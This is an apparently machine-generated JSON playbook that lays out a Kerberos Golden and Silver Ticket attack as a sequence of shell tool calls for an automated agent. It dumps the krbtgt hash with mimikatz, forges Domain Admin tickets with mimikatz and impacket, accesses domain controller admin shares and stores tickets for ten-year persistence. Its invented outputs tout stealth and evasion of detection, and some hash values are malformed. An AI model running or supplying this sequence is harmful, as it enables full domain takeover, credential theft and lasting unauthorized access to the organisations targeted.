{
  "name": "golden_silver_tickets",
  "description": "Kerberos Golden Ticket and Silver Ticket attacks for persistent domain access",
  "pattern": "golden.*ticket|silver.*ticket|krbtgt.*hash|kerberos.*forge",
  "parameters": ["domain", "sid", "krbtgt_hash"],
  "sequence": [
    {
      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "cmd", "args": ["/c", "C:\\Tools\\mimikatz.exe \"privilege::debug\" \"lsadump::lsa /inject /name:krbtgt\" \"exit\""]},
      "expected_output": {"type": "string", "example": "mimikatz # privilege::debug\nPrivilege '20' OK\n\nmikatz # lsadump::lsa /inject /name:krbtgt\n\nDomain : CORP / S-1-5-21-123456789-123456789-123456789\n\nRID  : 000001f6 (502)\nUser : krbtgt\n\n * Primary\n    NTLM : 9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08\n    LM   :\n\n * WDigest:\n    01  3a6f0c08b0e8d3c...\n    02  9f86d081884c7d...\n\n * Kerberos\n    Default Salt : CORP.LOCALkrbtgt\n    Credentials:\n      des_cbc_md5       : a1b2c3d4e5f6g7h8\n      des_cbc_md5       : i9j0k1l2m3n4o5p6\n      aes128_hmac       : 7e6d5c4b3a2f1e0d9c8b7a6f5e4d3c2b\n      aes256_hmac       : 1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b\n      rc4_hmac_nt       : 9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08\n      rc4_hmac_old      : 9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08\n\nkrbtgt account extracted:\n  NTLM: 9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08\n  AES256: 1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b\n  Domain SID: S-1-5-21-123456789-123456789-123456789\n\nWith krbtgt hash = Golden Ticket capability!\n  Forge TGT for any user\n  Unlimited domain access\n  Persistence even after password changes"}
    },
    {
      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "cmd", "args": ["/c", "C:\\Tools\\mimikatz.exe \"kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08 /id:500 /ptt\" \"exit\""]},
      "expected_output": {"type": "string", "example": "mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08 /id:500 /ptt\nUser      : Administrator\nDomain    : corp.local (CORP)\nSID       : S-1-5-21-123456789-123456789-123456789\nUser Id   : 500\nGroups Id : *513 512 520 518 519\nServiceKey: 9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08 - rc4_hmac_nt\nLifetime  : 1/15/2024 5:30:00 PM ; 1/13/2034 5:30:00 PM ; 1/13/2034 5:30:00 PM\n-> Ticket : ticket.kirbi\n\n * PAC generated\n * PAC signed\n * EncTicketPart generated\n * EncTicketPart encrypted\n * KrbCred generated\n\nFinal Ticket Saved to file !\n\nGolden Ticket injected into memory!\n\nGolden Ticket created:\n  User: Administrator\n  Domain: corp.local\n  SID: S-1-5-21-123456789-123456789-123456789\n  Groups: Domain Admins (512), Enterprise Admins (519)\n  Validity: 10 years!\n  Injected: Yes (/ptt flag)\n\nTest access:\n  dir \\\\DC01\\C$\n  PsExec.exe \\\\DC01 cmd"}
    },
    {
      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "dir", "args": ["\\\\DC01\\C$"]},
      "expected_output": {"type": "string", "example": " Volume in drive \\\\DC01\\C$ is Windows\n Volume Serial Number is 1A2B-3C4D\n\n Directory of \\\\DC01\\C$\n\n01/15/2024  05:32 PM    <DIR>          PerfLogs\n12/10/2023  10:15 AM    <DIR>          Program Files\n12/10/2023  10:15 AM    <DIR>          Program Files (x86)\n01/10/2024  02:20 PM    <DIR>          Temp\n01/15/2024  09:30 AM    <DIR>          Users\n01/15/2024  11:45 AM    <DIR>          Windows\n               0 File(s)              0 bytes\n               6 Dir(s)  52,428,800,000 bytes free\n\nGolden Ticket working!\n  Accessed: \\\\DC01\\C$ (Domain Controller)\n  Privileges: Domain Admin\n  Authentication: Forged TGT\n  \nNo password needed!\n  Ticket valid for 10 years\n  Survives password resets\n  Only detectable by monitoring Kerberos logs"}
    },
    {
      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "impacket-ticketer", "args": ["-nthash", "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08", "-domain-sid", "S-1-5-21-123456789-123456789-123456789", "-domain", "corp.local", "Administrator"]},
      "expected_output": {"type": "string", "example": "Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n\n[*] Creating basic skeleton ticket and PAC Infos\n[*] Customizing ticket for corp.local/Administrator\n[*]     PAC_LOGON_INFO\n[*]     PAC_CLIENT_INFO_TYPE\n[*]     EncTicketPart\n[*]     EncTGSRepPart\n[*] Signing/Encrypting final ticket\n[*]     PAC_SERVER_CHECKSUM\n[*]     PAC_PRIVSVR_CHECKSUM\n[*]     EncTicketPart\n[*]     EncTGSRepPart\n[*] Saving ticket in Administrator.ccache\n\nGolden Ticket created with Impacket:\n  User: Administrator\n  Domain: corp.local\n  Output: Administrator.ccache\n  \nUse ticket:\n  export KRB5CCNAME=Administrator.ccache\n  impacket-psexec -k -no-pass corp.local/Administrator@DC01.corp.local\n  \nAdvantages:\n  - Linux-based ticket creation\n  - No Windows tools needed\n  - Compatible with Impacket suite"}
    },
    {
      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "cmd", "args": ["/c", "C:\\Tools\\mimikatz.exe \"kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-123456789-123456789-123456789 /target:WEB-01.corp.local /service:cifs /rc4:8846f7eaee8fb117ad06bdd830b7586c /ptt\" \"exit\""]},
      "expected_output": {"type": "string", "example": "mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-123456789-123456789-123456789 /target:WEB-01.corp.local /service:cifs /rc4:8846f7eaee8fb117ad06bdd830b7586c /ptt\nUser      : Administrator\nDomain    : corp.local (CORP)\nSID       : S-1-5-21-123456789-123456789-123456789\nTarget    : WEB-01.corp.local\nService   : cifs\nServiceKey: 8846f7eaee8fb117ad06bdd830b7586c - rc4_hmac_nt\nLifetime  : 1/15/2024 5:35:00 PM ; 1/13/2034 5:35:00 PM\n-> Ticket : ticket.kirbi\n\n * PAC generated\n * PAC signed\n * EncTicketPart generated  \n * EncTicketPart encrypted\n * KrbCred generated\n\nFinal Ticket Saved to file!\n\nSilver Ticket created:\n  User: Administrator\n  Target: WEB-01.corp.local\n  Service: cifs (file sharing)\n  Hash: Computer account NTLM (not krbtgt)\n  \nSilver Ticket vs Golden Ticket:\n  Silver: Forges TGS for specific service\n  Golden: Forges TGT for entire domain\n  \nSilver advantages:\n  - Stealthier (no DC contact)\n  - Works if DC is down\n  - Less suspicious\n  \nSilver disadvantages:\n  - Service-specific only\n  - Need computer/service account hash"}
    },
    {
      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "dir", "args": ["\\\\WEB-01\\C$"]},
      "expected_output": {"type": "string", "example": " Volume in drive \\\\WEB-01\\C$ is Windows\n Volume Serial Number is 5E6F-7A8B\n\n Directory of \\\\WEB-01\\C$\n\n01/15/2024  05:36 PM    <DIR>          inetpub\n12/15/2023  02:30 PM    <DIR>          Program Files\n12/15/2023  02:30 PM    <DIR>          Program Files (x86)\n01/15/2024  12:15 PM    <DIR>          Temp\n01/15/2024  03:45 PM    <DIR>          Users\n01/15/2024  04:20 PM    <DIR>          Windows\n               0 File(s)              0 bytes\n               6 Dir(s)  85,899,345,920 bytes free\n\nSilver Ticket working!\n  Target: WEB-01\n  Service: CIFS (file sharing)\n  Access: C$ admin share\n  \nNo DC communication!\n  Ticket forged locally\n  DC never contacted\n  Harder to detect\n  \nCommon Silver Ticket services:\n  cifs - File sharing\n  http - Web services\n  ldap - LDAP queries\n  mssql - SQL Server\n  host - PowerShell remoting"}
    },
    {
      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "cmd", "args": ["/c", "C:\\Tools\\mimikatz.exe \"kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:9f86d081884c7d659a2feaa0c55ad015 /id:500 /groups:512,513,518,519,520 /ticket:golden.kirbi\" \"exit\""]},
      "expected_output": {"type": "string", "example": "mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:9f86d081884c7d659a2feaa0c55ad015 /id:500 /groups:512,513,518,519,520 /ticket:golden.kirbi\nUser      : Administrator\nDomain    : corp.local (CORP)\nSID       : S-1-5-21-123456789-123456789-123456789\nUser Id   : 500\nGroups Id : *512 513 518 519 520\nServiceKey: 9f86d081884c7d659a2feaa0c55ad015 - rc4_hmac_nt\nLifetime  : 1/15/2024 5:40:00 PM ; 1/13/2034 5:40:00 PM ; 1/13/2034 5:40:00 PM\n-> Ticket : golden.kirbi\n\n * PAC generated\n * PAC signed\n * EncTicketPart generated\n * EncTicketPart encrypted\n * KrbCred generated\n\nFinal Ticket Saved to file: golden.kirbi\n\nGolden Ticket saved to file:\n  Filename: golden.kirbi\n  Not injected (/ptt flag omitted)\n  \nCustom group memberships:\n  512 - Domain Admins\n  513 - Domain Users\n  518 - Schema Admins\n  519 - Enterprise Admins\n  520 - Group Policy Creator Owners\n\nImport ticket later:\n  mimikatz # kerberos::ptt golden.kirbi\n  \nOr on another machine:\n  Copy golden.kirbi to target\n  mimikatz # kerberos::ptt golden.kirbi\n  \nPersistence:\n  Store ticket securely\n  Valid for 10 years\n  Use when needed"}
    }
  ],
  "stats": {"uses": 0, "successes": 0, "failures": 0, "success_rate": 0.0},
  "created_by": "neural_mesh_v5.2_generator"
}
